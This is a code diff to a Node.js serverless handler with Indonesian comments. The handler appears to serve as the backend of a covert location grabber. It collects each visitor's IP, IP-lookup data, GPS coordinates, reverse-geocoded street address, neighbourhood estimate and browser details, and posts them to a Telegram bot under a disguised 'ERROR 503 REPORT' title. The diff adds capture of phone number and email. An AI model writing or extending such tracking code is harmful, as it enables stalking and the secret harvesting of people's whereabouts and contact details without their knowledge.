@@ -2,7 +2,7 @@ export const config = {
   runtime: "nodejs"
 };
 
-/* ===== ESTIMASI RT/RW (LABEL AREA, BUKAN DATA ASLI) ===== */
+/* ===== ESTIMASI RT/RW (LABEL SAJA) ===== */
 function estimateRTRW(lat, lon) {
   if (!lat || !lon) return "-";
   const lt = Math.abs(parseFloat(lat));
@@ -12,13 +12,21 @@ function estimateRTRW(lat, lon) {
   return `RT~${rt} / RW~${rw} (estimasi area)`;
 }
 
-/* ===== KUALITAS LOKASI BERDASARKAN AKURASI ===== */
+/* ===== KUALITAS LOKASI ===== */
 function getLocationQuality(acc) {
   const a = parseFloat(acc);
   if (isNaN(a)) return "Low ❌";
   if (a <= 20) return "High ✅";
   if (a <= 100) return "Medium ⚠️";
   return "Low ❌";
+}
+
+/* ===== NORMALISASI IP ===== */
+function normalizeIP(ip) {
+  if (!ip) return "Unknown";
+  if (ip === "::1" || ip.startsWith("127.")) return "Unknown";
+  if (ip.includes(",")) return ip.split(",")[0];
+  return ip.replace("::ffff:", "");
 }
 
 export default async function handler(req, res) {
@@ -35,22 +43,24 @@ export default async function handler(req, res) {
   const input = req.body || {};
 
   /* ===== IP CLIENT ===== */
-  const ip =
+  const rawIP =
     req.headers["cf-connecting-ip"] ||
-    req.headers["x-forwarded-for"]?.split(",")[0] ||
-    req.socket.remoteAddress ||
-    "Unknown";
+    req.headers["x-forwarded-for"] ||
+    req.socket.remoteAddress;
 
+  const ip = normalizeIP(rawIP);
   const time = new Date().toISOString().replace("T", " ").split(".")[0];
 
   /* ===== IP INFO ===== */
   let ipinfo = {};
-  try {
-    const r = await fetch(`https://ipapi.co/${ip}/json/`);
-    ipinfo = await r.json();
-  } catch {}
+  if (ip !== "Unknown") {
+    try {
+      const r = await fetch(`https://ipapi.co/${ip}/json/`);
+      ipinfo = await r.json();
+    } catch {}
+  }
 
-  /* ===== REVERSE GEOCODE + FALLBACK ===== */
+  /* ===== REVERSE GEOCODE ===== */
   let address = {};
   let locationSource = "GPS";
 
@@ -58,9 +68,7 @@ export default async function handler(req, res) {
     try {
       const geoRes = await fetch(
         `https://nominatim.openstreetmap.org/reverse?format=json&lat=${input.latitude}&lon=${input.longitude}&zoom=18&addressdetails=1`,
-        {
-          headers: { "User-Agent": "VercelLocationBot/1.0" }
-        }
+        { headers: { "User-Agent": "VercelLocationBot/1.0" } }
       );
       const geo = await geoRes.json();
       address = geo.address || {};
@@ -75,14 +83,17 @@ export default async function handler(req, res) {
     };
   }
 
-  const accuracyMeter = input.accuracy || "-";
   const locationQuality = getLocationQuality(input.accuracy);
   const rtRwEstimate =
     input.latitude && input.latitude !== "Not Allowed"
       ? estimateRTRW(input.latitude, input.longitude)
       : "-";
 
-  /* ===== FORMAT PESAN TELEGRAM ===== */
+  /* ===== DATA KONTAK (OPSIONAL, DARI FORM) ===== */
+  const phone = input.phone || "-";
+  const email = input.email || "-";
+
+  /* ===== PESAN TELEGRAM ===== */
   const message = `🚨 *ERROR 503 REPORT*
 
 ━━━━━━━━━━━━━━━━━━━━
@@ -113,7 +124,7 @@ ${input.browser || "-"}
 ━━━━━━━━━━━━━━━━━━━━
 📐 Latitude     : ${input.latitude || "-"}
 📏 Longitude    : ${input.longitude || "-"}
-🎯 Accuracy     : ${accuracyMeter}
+🎯 Accuracy     : ${input.accuracy || "-"}
 
 ━━━━━━━━━━━━━━━━━━━━
 🏠 *ADDRESS INFORMATION*
@@ -133,12 +144,17 @@ ${input.browser || "-"}
 🧭 Area Estimate: ${rtRwEstimate}
 📡 Source       : ${locationSource}
 
+━━━━━━━━━━━━━━━━━━━━
+☎️ *CONTACT (OPTIONAL)*
+━━━━━━━━━━━━━━━━━━━━
+📞 Phone        : ${phone}
+📧 Email        : ${email}
+
 🗺 Google Maps:
 https://www.google.com/maps?q=${input.latitude},${input.longitude}
 
 ⏰ Time : ${time}`;
 
-  /* ===== KIRIM KE TELEGRAM ===== */
   try {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
@@ -149,9 +165,8 @@ https://www.google.com/maps?q=${input.latitude},${input.longitude}
         parse_mode: "Markdown"
       })
     });
-
     return res.status(200).send("OK");
   } catch {
-    return res.status(500).send("Gagal kirim Telegram");
+    return res.status(500).send("Gagal kirim");
   }
-                    }
+      }
